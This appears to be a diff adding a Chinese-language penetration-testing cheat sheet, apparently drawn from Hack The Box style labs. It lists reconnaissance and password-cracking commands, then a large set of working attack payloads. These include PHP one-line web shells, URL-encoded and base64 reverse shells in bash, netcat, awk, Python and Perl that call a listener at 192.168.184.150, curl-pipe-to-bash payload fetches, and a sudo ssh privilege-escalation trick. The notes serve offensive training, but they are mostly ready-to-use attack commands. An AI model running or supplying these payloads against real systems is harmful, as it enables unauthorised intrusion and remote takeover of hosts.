@@ -1,0 +1,153 @@
+1.信息收集
+	a.服务器相关信息（IP、系统类型、版本、开放端口、域名、有无对应版本漏洞）
+		nmap
+		whatweb
+		searchsploit
+		https（查看Certificate证书）
+	b.网站指纹（cms、cdn、证书、DNS记录、网站框架）
+		
+	c.whois信息（姓名、备案、邮箱、电话）
+	d.子域名收集、旁站、C段
+		ffuf（速度快）
+			ffuf -u http://jupiter.htb -H "Host: FUZZ.jupiter.htb" -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302,301,404 -s -mc 200,500,505 -c
+					目标				header头	  FUZZ替换		线程率		字典													不显示	          简洁输出   显示          状态码颜色
+		wfuzz（较简洁，速度快）
+			wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302 --sc 200 -c
+
+		gobuster（有进度，但速度慢，连接不好）
+			gobuster vhost -w /usr/share/wordlists/subnames.txt -u http://thetoppers.htb -t 20
+			gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.zip -b 301,404,403 -t 20
+
+	e.google hacking
+		
+	f.扫描网站目录结构，爆破后台，爆破账号密码，备份文件
+		御剑/gobuster/dirb/dirsearch // wpscan/hydra/john
+
+			gobuster dir -u http://10.10.11.229/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.zip
+
+			dirb http://10.10.11.229 -X .php
+
+			dirsearch -u http://10.10.11.229/ -e * -x 403 -w 字典 -r -R 2
+												排除		     递归 深度
+
+			wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt  -u http://dev.devvortex.htb/FUZZ -t 200 --hc 404,403 -c
+
+			john --format=bcrypt --wordlist=/usr/share/wordlists/passwords/rockyou.txt password
+			john --wordlist=/usr/share/wordlists/rockyou.txt password
+			（hash格式要符合要求，如：$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+									joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2）
+
+			hashcat -a 0 -m 3200 password /usr/share/wordlists/rockyou.txt (--show)
+																	已破解的文件
+			（hash格式要符合要求，如：$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2）
+
+			备份文件：常见网站备份文件类型（”.git” “.svn”“ .swp”“.~”“.bak”“.bash_history”“.bkf”“.old”“robots.txt”“.rar”“.zip”“.sql”“.db”）
+					  
+
+
+2.漏洞测试
+	SQL注入、文件上传、命令执行、XSS、XXE、弱口令、文件包含
+
+
+3.漏洞利用
+	getshell（代码执行：eval() assert() preg_replace() call_user_func() call_user_func_array() create_function() array_map()）
+		（系统命令执行：system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号) ob_start() mail()）
+		web shell
+			<?php @eval($_POST[cmd]);?>	<?php @system($_POST[cmd]);?>
+
+		反弹shell (web shell的基础上，远程代码执行)	（bash sh /bin/sh /bin/bash 可以互换）	（get环境下可以运行命令；post环境下需要上传可执行文件，传输时会出现格式问题）
+			 ！！！（${IFS%??}可以当成空格使用）	（bp里发送要url编码）		！！！	（get会将提交的数据进行编码和解码，post则不会，所以post提交的数据不能是编码的）  ！！！
+
+
+
+								（system() 函数条件下，GET可用，POST不可用，经过url编码的数据）
+			cmd=/bin/bash -c "rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.184.150%201234%20%3E%2Ftmp%2Ff"
+
+			cmd=/bin/bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.184.150%2F1234%200%3E%261"
+
+			cmd=awk 'BEGIN{s="/inet/tcp/0/192.168.184.150/1234";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'
+
+			cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.184.150",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+			cmd=export RHOST="192.168.184.150";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+			cmd=perl -e 'use Socket;$i="192.168.184.150";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+
+					（POST|GET环境下使用）
+			cmd=wget -P /tmp/ http://192.168.184.150/shell.sh		(上传保存好的反弹shell文件，避免传输时出现格式问题)（内容：sh -i >& /dev/tcp/192.168.184.150/1234 0>&1）
+			cmd=bash /tmp/shell.sh						(运行上传的反弹shell)
+
+			cmd=curl http://192.168.184.150/shell.sh | bash			(!!!)
+
+			cmd=/bin/bash -c "sh -i >& /dev/tcp/192.168.184.150/1234 0>&1"
+			cmd=bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}
+
+			cmd=/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.184.150 1234 >/tmp/f"
+
+
+
+
+								(php eval() 函数条件下，POST|GET通用)（get环境下可以运行命令；post环境下需要上传可执行文件，传输时会出现格式问题）
+			cmd=phpinfo();
+			cmd=system('id');	(命令执行格式)
+						(套用system()的使用方法)
+			cmd=system('wget -P /tmp/ http://192.168.184.150/shell.sh');	(上传保存好的反弹shell文件，避免传输时出现格式问题)（内容：sh -i >& /dev/tcp/192.168.184.150/1234 0>&1）
+			cmd=system('bash /tmp/shell.sh');				(运行上传的反弹shell)	（bash 可替换成 sh /bin/sh /bin/bash）
+
+
+
+
+								(python3 下 eval 反弹shell)
+			cmd=__import__('subprocess').call(\"echo 'sh -i >& /dev/tcp/192.168.184.150/1234 0>&1'>x && bash x && rm -rf x\",shell=True)
+
+
+
+
+	命令行开启shell
+		python -c 'import pty; pty.spawn("/bin/bash")'
+		python -c 'import os; os.system("/bin/bash")'
+
+4.权限提升
+	ssh密钥连接（将公钥写入/root/.ssh/authorized_keys，然后用私钥连接）
+		ssh-keygen	生成公私钥(私钥在root，公钥在root.pub)
+		ssh root root@localhost
+
+	密码爆破
+		John（爆破hash）
+			john ./pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+	从网站获取sql用户密码
+		jd-gui（查看jar包）
+			jd-gui cloudhosting-0.0.1.jar
+
+
+	msf						（运行模块成功后运行shell命令，再创建原生终端）
+
+	python -c 'import pty;pty.spawn("/bin/bash")'	（开启一个终端）
+
+	详细查找文件内容					（可能包含数据库用户和密码、serect_key）
+
+	sudo -l						（查找高权限文件，利用文件反弹 或 运行/bin/bash获取权限）
+
+		/usr/bin/ssh				（https://gtfobins.github.io/gtfobins/ssh/#sudo）
+			sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+	find / -perm -u=s -type f 2>/dev/null		（查找拥有s权限的文件，如果一个可执行程序针对所有者具有 s 权限，那么当任意用户执行这个程序时，将以这个程序所有者的身份执行）
+
+
+	linpeas.sh					（提权辅助工具）
+
+
+5.权限维持
+
+
+6.内网扫描
+
+
+7.内网攻击
+
+
+8.痕迹清理
+
+
+9.总结报告及修复方案
